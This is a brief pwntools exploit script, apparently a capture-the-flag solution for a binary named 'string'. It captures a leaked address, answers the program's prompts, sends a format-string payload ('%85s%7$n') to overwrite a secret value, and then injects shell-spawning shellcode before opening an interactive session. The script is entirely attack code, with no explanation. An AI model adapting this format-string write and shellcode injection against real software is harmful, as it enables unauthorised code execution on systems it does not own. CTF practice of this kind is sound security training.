from pwn import *
binary = "./string"
# context.terminal = ['tmux', 'splitw', '-h']

# libc_binary = "./"

p = process(binary)
context(arch='amd64', os='linux')
# p = remote("",)
# elf = ELF(binary)
# libc = ELF(libc_binary)
# gdb.attach(p)
p.recvuntil("secret[0] is ")
secret_addr = int(p.recv().split('\n')[0],16)
p.sendline("asdf")
p.sendlineafter("So, where you will go?east or up?:","east")
p.sendlineafter("go into there(1), or leave(0)?:","1")
p.sendlineafter("Give me an address",str(secret_addr))
p.sendlineafter("And, you wish is:\n","%85s%7$n")
p.sendlineafter("USE YOU SPELL",asm(shellcraft.sh()))

p.interactive()
